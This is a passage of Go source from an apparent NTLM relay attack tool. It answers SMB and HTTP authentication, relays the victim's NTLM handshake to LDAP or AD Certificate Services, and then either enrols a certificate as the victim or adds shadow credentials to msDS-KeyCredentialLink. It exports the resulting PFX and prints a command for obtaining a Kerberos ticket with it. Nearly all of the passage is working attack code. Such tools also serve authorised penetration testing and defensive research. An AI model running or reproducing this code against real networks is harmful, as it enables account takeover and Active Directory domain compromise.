		0x30, 0x3c, 0xa0, 0x0e, 0x30, 0x0c, 0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04,
		0x01, 0x82, 0x37, 0x02, 0x02, 0x0a, 0xa3, 0x2a, 0x30, 0x28, 0xa0, 0x26,
		0x1b, 0x24, 0x6e, 0x6f, 0x74, 0x5f, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65,
		0x64, 0x5f, 0x69, 0x6e, 0x5f, 0x52, 0x46, 0x43, 0x34, 0x31, 0x37, 0x38,
		0x40, 0x70, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x5f, 0x69, 0x67, 0x6e, 0x6f,
		0x72, 0x65,
	}

	binary.LittleEndian.PutUint16(response[offset:offset+2], uint16(128))
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], uint16(len(securityBlob)))
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)

	response = append(response[:128], securityBlob...)

	return response
}

// buildSMB2NegotiateResponse builds an SMB2 NEGOTIATE response for direct SMB2 requests
func (h *ADCSRelayHandler) buildSMB2NegotiateResponse(header *smb.SMB2Header) []byte {
	response := make([]byte, 128)
	offset := 0

	copy(response[offset:offset+4], []byte{0xFE, 'S', 'M', 'B'})
	offset += 4
	binary.LittleEndian.PutUint16(response[offset:offset+2], 64)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0)
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4
	binary.LittleEndian.PutUint16(response[offset:offset+2], smb.SMB2_NEGOTIATE)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 1)
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0x00000001)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], header.MessageID)
	offset += 8
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], 0)
	offset += 8
	offset += 16

	binary.LittleEndian.PutUint16(response[offset:offset+2], 65)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], smb.SMB2_NEGOTIATE_SIGNING_ENABLED|smb.SMB2_NEGOTIATE_SIGNING_REQUIRED)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0x0202)
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], 0)
	offset += 2
	guid := []byte{0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF, 0x01, 0x23, 0x45, 0x67, 0x89, 0xAB, 0xCD, 0xEF}
	copy(response[offset:offset+16], guid)
	offset += 16
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0x00000001)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536)
	offset += 4
	binary.LittleEndian.PutUint32(response[offset:offset+4], 65536)
	offset += 4
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(time.Now().Unix()+11644473600)*10000000)
	offset += 8
	binary.LittleEndian.PutUint64(response[offset:offset+8], uint64(time.Now().Unix()+11644473600)*10000000)
	offset += 8

	securityBlob := []byte{
		0x60, 0x48, 0x06, 0x06, 0x2b, 0x06, 0x01, 0x05, 0x05, 0x02, 0xa0, 0x3e,
		0x30, 0x3c, 0xa0, 0x0e, 0x30, 0x0c, 0x06, 0x0a, 0x2b, 0x06, 0x01, 0x04,
		0x01, 0x82, 0x37, 0x02, 0x02, 0x0a, 0xa3, 0x2a, 0x30, 0x28, 0xa0, 0x26,
		0x1b, 0x24, 0x6e, 0x6f, 0x74, 0x5f, 0x64, 0x65, 0x66, 0x69, 0x6e, 0x65,
		0x64, 0x5f, 0x69, 0x6e, 0x5f, 0x52, 0x46, 0x43, 0x34, 0x31, 0x37, 0x38,
		0x40, 0x70, 0x6c, 0x65, 0x61, 0x73, 0x65, 0x5f, 0x69, 0x67, 0x6e, 0x6f,
		0x72, 0x65,
	}

	binary.LittleEndian.PutUint16(response[offset:offset+2], uint16(128))
	offset += 2
	binary.LittleEndian.PutUint16(response[offset:offset+2], uint16(len(securityBlob)))
	offset += 2
	binary.LittleEndian.PutUint32(response[offset:offset+4], 0)

	response = append(response[:128], securityBlob...)

	return response
}

// parseSMB1Dialects parses dialect strings from SMB1 NEGOTIATE
func (h *ADCSRelayHandler) parseSMB1Dialects(packet []byte) ([]string, error) {
	if len(packet) < 35 {
		return nil, fmt.Errorf("packet too short")
	}

	wordCount := packet[32]
	if wordCount != 0 {
		return nil, fmt.Errorf("unexpected WordCount: %d", wordCount)
	}

	byteCount := binary.LittleEndian.Uint16(packet[33:35])
	if len(packet) < 35+int(byteCount) {
		return nil, fmt.Errorf("packet too short for ByteCount")
	}

	var dialects []string
	offset := 35
	end := 35 + int(byteCount)

	for offset < end {
		if packet[offset] != 0x02 {
			break
		}
		offset++

		start := offset
		for offset < end && packet[offset] != 0 {
			offset++
		}

		dialect := string(packet[start:offset])
		dialects = append(dialects, dialect)
		offset++
	}

	return dialects, nil
}

// HTTPRelayHandler handles HTTP NTLM relay attacks
type HTTPRelayHandler struct {
	conn              net.Conn
	ldapClient        *LDAPClient
	adcsClient        *ADCSClient
	targetUser        string
	targetDomain      string // Domain for UPN in certificate
	authenticatedUser string // Store the username from Type 3 for naming the PFX file
	outputPath        string
	pfxPass           string
	logger            *output.Logger
	onSuccess         func(pfxPath string)
	useNegotiate      bool            // Track if client is using Negotiate (SPNEGO) vs plain NTLM
	privateKey        *rsa.PrivateKey // Store private key for ADCS certificate enrollment
	server            *Server         // Reference to server for first-success tracking
}

// Handle processes HTTP NTLM authentication and relays to target
func (h *HTTPRelayHandler) Handle(ctx context.Context) error {
	defer h.conn.Close()

	// If this is ADCS mode, generate private key and prepare CSR BEFORE authentication
	if h.adcsClient != nil {
		privateKey, err := rsa.GenerateKey(rand.Reader, 2048)
		if err != nil {
			return fmt.Errorf("failed to generate RSA key: %w", err)
		}
		h.privateKey = privateKey

		// Prepare CSR before starting authentication
		if err := h.adcsClient.PrepareCSR(privateKey, h.targetUser); err != nil {
			return fmt.Errorf("failed to prepare CSR: %w", err)
		}
	}

	// Set read timeout
	h.conn.SetReadDeadline(time.Now().Add(30 * time.Second))

	// Read HTTP request
	buf := make([]byte, 8192)
	n, err := h.conn.Read(buf)
	if err != nil {
		return fmt.Errorf("failed to read HTTP request: %w", err)
	}

	request := string(buf[:n])
	h.logger.Debug(fmt.Sprintf("Received HTTP request (%d bytes)", n))

	// Parse Authorization header
	var authHeader string
	lines := splitHTTPLines(request)
	for _, line := range lines {
		if len(line) > 15 && (line[:15] == "Authorization: " || line[:15] == "authorization: ") {
			authHeader = line[15:]
			break
		}
	}

	if authHeader == "" {
		// No authentication yet, send 401 to trigger NTLM
		// Only offer NTLM (not Negotiate) to prevent client from using Kerberos/SPNEGO
		h.logger.Debug("No Authorization header, sending 401 Unauthorized")
		response := "HTTP/1.1 401 Unauthorized\r\n" +
			"WWW-Authenticate: NTLM\r\n" +
			"MS-Author-Via: DAV\r\n" +
			"DAV: 1, 2\r\n" +
			"Content-Length: 0\r\n" +
			"Connection: keep-alive\r\n" +
			"\r\n"
		h.conn.Write([]byte(response))

		// Read next request with NTLM Type 1
		h.conn.SetReadDeadline(time.Now().Add(30 * time.Second))
		n, err = h.conn.Read(buf)
		if err != nil {
			return fmt.Errorf("failed to read NTLM Type 1 request: %w", err)
		}
		request = string(buf[:n])

		// Re-parse Authorization header
		lines = splitHTTPLines(request)
		for _, line := range lines {
			if len(line) > 15 && (line[:15] == "Authorization: " || line[:15] == "authorization: ") {
				authHeader = line[15:]
				break
			}
		}
	}

	// Handle NTLM authentication
	if len(authHeader) > 5 && authHeader[:5] == "NTLM " {
		h.useNegotiate = false
		return h.handleNTLMAuth(authHeader[5:])
	}

	// Handle Negotiate (SPNEGO-wrapped NTLM)
	if len(authHeader) > 10 && authHeader[:10] == "Negotiate " {
		h.logger.Debug("Received Negotiate authentication, attempting to unwrap NTLM")
		h.useNegotiate = true
		return h.handleNTLMAuth(authHeader[10:])
	}

	return fmt.Errorf("unsupported authentication method")
}

// handleNTLMAuth handles NTLM authentication flow
func (h *HTTPRelayHandler) handleNTLMAuth(ntlmBase64 string) error {
	// Decode NTLM message
	ntlmData, err := base64.StdEncoding.DecodeString(ntlmBase64)
	if err != nil {
		return fmt.Errorf("failed to decode NTLM message: %w", err)
	}

	if len(ntlmData) < 12 {
		return fmt.Errorf("NTLM message too short")
	}

	// Check if this is SPNEGO-wrapped (doesn't start with NTLMSSP)
	if string(ntlmData[0:8]) != "NTLMSSP\x00" {
		// Try to unwrap SPNEGO
		unwrapped, err := smb.UnwrapSPNEGO(ntlmData)
		if err != nil {
			return fmt.Errorf("failed to unwrap SPNEGO: %w", err)
		}
		ntlmData = unwrapped
	}

	// Check NTLMSSP signature again
	if string(ntlmData[0:8]) != "NTLMSSP\x00" {
		return fmt.Errorf("invalid NTLMSSP signature")
	}

	// Get message type
	msgType := binary.LittleEndian.Uint32(ntlmData[8:12])
	h.logger.Debug(fmt.Sprintf("Received NTLM Type %d (%d bytes)", msgType, len(ntlmData)))

	switch msgType {
	case 1:
		// Type 1 - Negotiate
		return h.handleNTLMType1(ntlmData)
	case 3:
		// Type 3 - Authenticate
		return h.handleNTLMType3(ntlmData)
	default:
		return fmt.Errorf("unexpected NTLM message type: %d", msgType)
	}
}

// handleNTLMType1 relays NTLM Type 1 and returns Type 2 challenge
func (h *HTTPRelayHandler) handleNTLMType1(type1 []byte) error {
	h.logger.Debug("Processing HTTP NTLM Type 1")

	var type2 []byte
	var err error

	if h.adcsClient != nil {
		// ADCS relay
		if err := h.adcsClient.Connect(); err != nil {
			return fmt.Errorf("failed to connect to ADCS: %w", err)
		}
		type2, err = h.adcsClient.ForwardNegotiate(type1)
	} else if h.ldapClient != nil {
		// LDAP relay
		if err := h.ldapClient.Connect(); err != nil {
			return fmt.Errorf("failed to connect to LDAP: %w", err)
		}
		// Query baseDN BEFORE SICILY authentication (after SICILY, servers don't respond to queries)
		if err := h.ldapClient.QueryBaseDNBeforeAuth(); err != nil {
			h.logger.Debug(fmt.Sprintf("Failed to query base DN before auth: %v", err))
			// Fallback: construct baseDN from target URL domain
			if domain := extractDomainFromURL(h.ldapClient.GetTargetURL()); domain != "" {
				baseDN := domainToBaseDN(domain)
				h.ldapClient.SetBaseDN(baseDN)
				h.logger.Info(fmt.Sprintf("Using constructed base DN: %s", baseDN))
			} else {
				h.logger.Warning("Could not determine base DN - attacks may fail")
			}
		}
		type2, err = h.ldapClient.ForwardNegotiate(type1)
	} else {
		return fmt.Errorf("no relay client configured")
	}

	if err != nil {
		return fmt.Errorf("failed to relay NTLM Type 1: %w", err)
	}

	h.logger.Debug(fmt.Sprintf("Received NTLM Type 2 challenge (%d bytes)", len(type2)))

	// Forward Type 2 unmodified to HTTP client
	// ntlmrelayx doesn't modify Type 2 for HTTP→LDAP relay

	// Wrap in SPNEGO if client used Negotiate
	var authScheme string
	var type2Base64 string

	if h.useNegotiate {
		// Wrap NTLM Type 2 in SPNEGO (false = not Type 1)
		spnegoWrapped := smb.WrapNTLMInSPNEGO(type2, false)
		type2Base64 = base64.StdEncoding.EncodeToString(spnegoWrapped)
		authScheme = "Negotiate"
	} else {
		// Plain NTLM
		type2Base64 = base64.StdEncoding.EncodeToString(type2)
		authScheme = "NTLM"
	}

	// Send 401 with NTLM Type 2 challenge
	response := "HTTP/1.1 401 Unauthorized\r\n" +
		"WWW-Authenticate: " + authScheme + " " + type2Base64 + "\r\n" +
		"Content-Length: 0\r\n" +
		"Connection: keep-alive\r\n" +
		"\r\n"

	if _, err := h.conn.Write([]byte(response)); err != nil {
		return fmt.Errorf("failed to send NTLM Type 2: %w", err)
	}

	h.logger.Debug("Sent HTTP NTLM Type 2 challenge")

	// Read Type 3 request
	h.conn.SetReadDeadline(time.Now().Add(30 * time.Second))
	buf := make([]byte, 8192)
	n, err := h.conn.Read(buf)
	if err != nil {
		return fmt.Errorf("failed to read NTLM Type 3 request: %w", err)
	}

	request := string(buf[:n])

	// Parse Authorization header from Type 3 request
	var authHeader string
	lines := splitHTTPLines(request)
	for _, line := range lines {
		if len(line) > 15 && (line[:15] == "Authorization: " || line[:15] == "authorization: ") {
			authHeader = line[15:]
			break
		}
	}

	if authHeader == "" {
		return fmt.Errorf("no Authorization header in Type 3 request")
	}

	// Check for both "NTLM " and "Negotiate " prefixes
	var ntlmData []byte
	if len(authHeader) > 10 && authHeader[:10] == "Negotiate " {
		// SPNEGO-wrapped Type 3
		spnegoData, err := base64.StdEncoding.DecodeString(authHeader[10:])
		if err != nil {
			return fmt.Errorf("failed to decode SPNEGO Type 3: %w", err)
		}
		// Unwrap SPNEGO to get NTLM
		ntlmData, err = smb.UnwrapSPNEGO(spnegoData)
		if err != nil {
			return fmt.Errorf("failed to unwrap SPNEGO Type 3: %w", err)
		}
	} else if len(authHeader) > 5 && authHeader[:5] == "NTLM " {
		// Plain NTLM Type 3
		var err error
		ntlmData, err = base64.StdEncoding.DecodeString(authHeader[5:])
		if err != nil {
			return fmt.Errorf("failed to decode NTLM Type 3: %w", err)
		}
	} else {
		return fmt.Errorf("unexpected auth header format in Type 3")
	}

	return h.handleNTLMType3(ntlmData)
}

// handleNTLMType3 relays NTLM Type 3 to complete authentication
func (h *HTTPRelayHandler) handleNTLMType3(type3 []byte) error {
	h.logger.Debug("Processing HTTP NTLM Type 3")

	// Log full Type 3 hex for analysis
	h.logger.Debug(fmt.Sprintf("Full HTTP Type 3 hex: %x", type3))

	// Parse the Type 3 message to extract the username
	parser := ntlm.NewAuthParser()
	authMsg, err := parser.Parse(type3)
	var csrUsername string
	if err == nil {
		username := authMsg.GetUserName()
		domain := authMsg.GetDomain()
		csrUsername = username // CSR subject is just the username, not domain\username
		if domain != "" {
			h.authenticatedUser = domain + "\\" + username
		} else {
			h.authenticatedUser = username
		}
		h.logger.Debug(fmt.Sprintf("Authenticated user: %s", h.authenticatedUser))

		// Check if this is the first successful relay (ADCS only - reject early)
		if h.adcsClient != nil && h.server != nil && !h.server.markFirstSuccess(h.authenticatedUser) {
			// Another relay already succeeded, reject this one
			response := "HTTP/1.1 401 Unauthorized\r\n" +
				"Content-Length: 0\r\n" +
				"Connection: close\r\n" +
				"\r\n"
			h.conn.Write([]byte(response))
			return fmt.Errorf("ignoring duplicate relay")
		}
	}

	if h.adcsClient != nil {
		// ADCS relay - regenerate CSR with authenticated username (just username, not domain\username)
		if csrUsername != "" && h.privateKey != nil {
			h.logger.Debug(fmt.Sprintf("Regenerating CSR with subject: %s", csrUsername))
			h.adcsClient.PrepareCSR(h.privateKey, csrUsername)
		}

		if err := h.adcsClient.ForwardAuthenticate(type3); err != nil {
			// Send 401 on failure
			response := "HTTP/1.1 401 Unauthorized\r\n" +
				"Content-Length: 0\r\n" +
				"Connection: close\r\n" +
				"\r\n"
			h.conn.Write([]byte(response))
			return fmt.Errorf("ADCS authentication failed: %w", err)
		}

		h.logger.Success("HTTP NTLM relay to ADCS successful!")

		// Send 200 OK
		response := "HTTP/1.1 200 OK\r\n" +
			"Content-Length: 0\r\n" +
			"Connection: close\r\n" +
			"\r\n"
		h.conn.Write([]byte(response))

		// Perform certificate enrollment
		return h.performADCSEnrollment()

	} else if h.ldapClient != nil {
		// LDAP relay - forward Type 3 unmodified
		// ntlmrelayx doesn't drop the MIC for HTTP→LDAP relay
		if err := h.ldapClient.ForwardAuthenticate(type3); err != nil {
			// Send 401 on failure
			response := "HTTP/1.1 401 Unauthorized\r\n" +
				"Content-Length: 0\r\n" +
				"Connection: close\r\n" +
				"\r\n"
			h.conn.Write([]byte(response))
			return fmt.Errorf("LDAP authentication failed: %w", err)
		}

		h.logger.Success("HTTP NTLM relay to LDAP successful!")

		// Send 200 OK
		response := "HTTP/1.1 200 OK\r\n" +
			"Content-Length: 0\r\n" +
			"Connection: close\r\n" +
			"\r\n"
		h.conn.Write([]byte(response))

		// Check if we should perform the attack (only first success)
		if h.server != nil {
			h.server.successMutex.Lock()
			alreadySucceeded := h.server.firstSuccessful
			if !alreadySucceeded {
				h.server.firstSuccessful = true
				h.server.attackInProgress = true // Block new connections
			}
			h.server.successMutex.Unlock()

			if alreadySucceeded {
				h.logger.Info("Shadow credentials attack already in progress by another connection")
				return nil
			}
		}
		// Perform shadow credentials attack
		return h.performShadowCredentials()
	}

	return fmt.Errorf("no relay client configured")
}

// performADCSEnrollment performs certificate enrollment after successful relay
func (h *HTTPRelayHandler) performADCSEnrollment() error {
	h.logger.Info("Performing certificate enrollment...")

	// Note: private key was already generated and CSR prepared before authentication
	// Authentication happened on the POST request with the CSR data
	// Now we just need to extract the certificate from the Type 3 response

	// Request certificate from ADCS (this should just parse the response from Type 3)
	cert, err := h.adcsClient.RequestCertificate(h.privateKey, h.targetUser)
	if err != nil {
		return fmt.Errorf("failed to request certificate: %w", err)
	}

	// Export as PFX
	pfxPath := h.outputPath
	if pfxPath == "" {
		// Use authenticated username for the filename
		if h.authenticatedUser != "" {
			// Replace backslash with underscore for filename safety
			safeUsername := h.authenticatedUser
			safeUsername = strings.ReplaceAll(safeUsername, "\\", "_")
			safeUsername = strings.ReplaceAll(safeUsername, "$", "")
			pfxPath = safeUsername + ".pfx"
		} else {
			pfxPath = "certificate.pfx"
		}
	}

	pfxPassword, err := shadowcreds.ExportPFX(h.privateKey, cert, h.pfxPass, pfxPath)
	if err != nil {
		return fmt.Errorf("failed to export PFX: %w", err)
	}

	h.logger.Success(fmt.Sprintf("Certificate saved to: %s", pfxPath))
	h.logger.Info(fmt.Sprintf("PFX Password: %s", pfxPassword))

	if h.onSuccess != nil {
		h.onSuccess(pfxPath)
	}

	return nil
}

// performShadowCredentials performs shadow credentials attack after successful relay
func (h *HTTPRelayHandler) performShadowCredentials() error {
	h.logger.Info("Performing shadow credentials attack...")

	// Get base DN from LDAP
	baseDN, err := h.ldapClient.GetBaseDN()
	if err != nil {
		return fmt.Errorf("failed to get base DN: %w", err)
	}

	// Resolve username to DN
	targetUsername := h.targetUser
	if !strings.Contains(targetUsername, "\\") {
		// If no domain prefix, use command line target user
		targetUsername = targetUsername
	} else {
		// Extract username from DOMAIN\USER format
		parts := strings.Split(targetUsername, "\\")
		if len(parts) == 2 {
			targetUsername = parts[1]
		}
	}

	// For computer accounts, construct DN directly instead of searching
	// LDAP searches timeout after SICILY authentication on Windows
	// Computer accounts are typically in CN=Computers,DC=domain,DC=com
	accountName := targetUsername
	if strings.HasSuffix(accountName, "$") {
		accountName = accountName[:len(accountName)-1]
	}
	userDN := fmt.Sprintf("CN=%s,CN=Computers,%s", accountName, baseDN)
	h.logger.Info(fmt.Sprintf("Constructed target DN: %s", userDN))

	// Create key credential using NewKeyCredential
	kc, err := shadowcreds.NewKeyCredential()
	if err != nil {
		return fmt.Errorf("failed to create key credential: %w", err)
	}

	// Build the key credential blob
	keyCredential, err := kc.BuildKeyCredentialBlob()
	if err != nil {
		return fmt.Errorf("failed to build key credential blob: %w", err)
	}

	// Add key to msDS-KeyCredentialLink via LDAP modify
	if err := h.ldapClient.ModifyKeyCredential(userDN, keyCredential); err != nil {
		return fmt.Errorf("failed to add key credential: %w", err)
	}

	h.logger.Success(fmt.Sprintf("Successfully added shadow credentials to %s", h.targetUser))

	// Generate certificate with UPN SAN for PKINIT
	cert, err := kc.GenerateCertificate(h.targetUser, h.targetDomain)
	if err != nil {
		return fmt.Errorf("failed to generate certificate: %w", err)
	}

	// Export PFX
	pfxPath := h.outputPath
	if pfxPath == "" {
		pfxPath = h.targetUser + ".pfx"
	}

	pfxPassword, err := shadowcreds.ExportPFX(kc.PrivateKey(), cert, h.pfxPass, pfxPath)
	if err != nil {
		return fmt.Errorf("failed to export PFX: %w", err)
	}

	h.logger.Success(fmt.Sprintf("Certificate exported to: %s", pfxPath))
	h.logger.Info(fmt.Sprintf("PFX Password: %s", pfxPassword))
	h.logger.Info(fmt.Sprintf("Use with: gettgtpkinit.py -cert-pfx %s -pfx-pass '%s' %s/%s", pfxPath, pfxPassword, h.targetDomain, h.targetUser))

	if h.onSuccess != nil {
		h.onSuccess(pfxPath)
	}

	return nil
}

// splitHTTPLines splits HTTP request into lines
func splitHTTPLines(request string) []string {
	var lines []string
	current := ""
	for i := 0; i < len(request); i++ {
		if request[i] == '\r' && i+1 < len(request) && request[i+1] == '\n' {
			lines = append(lines, current)
			current = ""
			i++ // Skip \n
		} else if request[i] == '\n' {
			lines = append(lines, current)
			current = ""
		} else {
			current += string(request[i])
		}
	}
	if current != "" {
		lines = append(lines, current)
	}
	return lines
}
